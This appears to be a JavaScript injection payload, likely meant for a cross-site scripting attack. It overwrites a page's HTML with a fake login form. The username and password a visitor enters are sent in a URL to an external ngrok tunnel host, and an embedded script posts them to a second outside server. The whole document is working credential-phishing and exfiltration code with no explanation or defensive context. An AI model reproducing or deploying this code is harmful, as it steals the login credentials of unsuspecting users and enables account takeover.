payload = `<!doctype html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Login</title><style>body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background-color:#f0f4f8;margin:0;padding:0;color:#333;display:flex;justify-content:center;align-items:center;height:100vh}.container{background-color:white;padding:30px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.1);width:100%;max-width:400px;box-sizing:border-box}h1{text-align:center;color:#4CAF50;font-size:2rem;margin-bottom:20px}h2{text-align:center;color:#555;font-size:1.25rem;margin-top:30px}form{display:flex;flex-direction:column;gap:15px}label{font-size:1rem;color:#444}input[type="text"],input[type="password"],textarea{padding:10px;font-size:1rem;border:1px solid #ccc;border-radius:4px;transition:border-color 0.3s ease;width:100%}input[type="text"]:focus,input[type="password"]:focus,textarea:focus{border-color:#4CAF50;outline:none}button{padding:10px;background-color:#4CAF50;color:white;font-size:1rem;border:none;border-radius:4px;cursor:pointer;transition:background-color 0.3s ease}button:hover{background-color:#45a049}textarea{resize:vertical;min-height:100px}.feedback-section{margin-top:20px}</style></head><body><div class="container"><h1>Login</h1><form id=loginForm><label for="username">Username:</label><input type="text" name="username" id="username" required placeholder="Enter your username"><label for="password">Password:</label><input type="password" name="password" id="password" required placeholder="Enter your password"><button type="submit">Login</button></form><div class="feedback-section"><h2>Send Feedback</h2><form method="post" action="/feedback"><label for="feedback-username">Username (Optional):</label><input type="text" name="username" id="feedback-username" placeholder="Your name (optional)"><br><textarea name="feedback" required placeholder="Enter your feedback..."></textarea><br><button type="submit">Send Feedback</button></form></div></div><script>document.getElementById('login-form').addEventListener('submit',e=>{e.preventDefault();fetch('http://miharadakzserv/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:document.querySelector('[name="username"]').value,password:document.querySelector('[name="password"]').value})}).then(res=>res.json()).catch(console.error);});</script></body></html>`
htmltag = document.getElementsByTagName("html")[0]
htmltag.innerHTML = payload

let loginForm = document.getElementById("loginForm");

loginForm.addEventListener("submit", (e) =>{
    e.preventDefault();

    let username = document.getElementById("username");
    let password = document.getElementById("password");

    if(username.value == "" || password.value== ""){
        alert("Isi Dulu");
    } else {
        fetch("https://92ff-180-252-123-206.ngrok-free.app/uname="+username.value+"&pwd="+password.value,{headers:{"ngrok-skip-browser-warning":true}})
    }
})

